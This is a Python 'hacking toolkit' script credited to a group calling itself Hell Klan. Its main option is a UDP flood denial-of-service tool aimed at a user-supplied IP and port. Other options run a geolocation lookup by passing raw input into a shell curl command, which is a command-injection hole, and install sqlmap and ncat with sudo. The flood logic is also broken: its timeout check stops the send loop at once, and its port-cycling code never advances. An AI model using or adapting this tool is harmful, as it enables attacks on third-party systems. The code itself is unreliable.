import os
import random
import socket
import time
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
timeout = time.time()
bytes = random._urandom(10000)
os.system("clear")
time.sleep(1)
os.system("figlet GIGA TOOLKIT")
time.sleep(2)
print("""
GIGA ToolKit by Hell Klan Team""")
time.sleep(1)
print("[1] DoS Tool")
time.sleep(0.5)
print("[2] Geo Ip Locator")
time.sleep(0.5)
print("""[3] Install Hacking Tools
""")
time.sleep(1)
opção = int(input("Choose Your Option:"))
if opção == 1:
    os.system("clear")
    ip = input("Target IP: ")
    port = int(input("Port: "))
    while True:
        while 1:
            if time.time() > timeout:
                break
            else:
                pass
            sock.sendto(bytes, (ip, port))
        print("ATTACK SENT BY HELL KLAN | TO STOP PRESS CTRL C")
        if port == 65500:
            port = 1
elif opção == 2:
    ipgeo = input("IP: ")
    os.system("curl https://ipgeolocation.io/ip-location/" + ipgeo)
    voltar = input("Para Voltar, Digite 0: ")
    if voltar == 0:
        os.system("python3 main.py")
    else:
        print("Comando Invalido, reiniciando script...")
        os.system("python3 main.py")
elif opção == 3:
    os.system("sudo apt install sqlmap && sudo apt install ncat-openbsd")
else:
        print("opção inválida, reiniciando script.")
        os.system("python3 main.py")
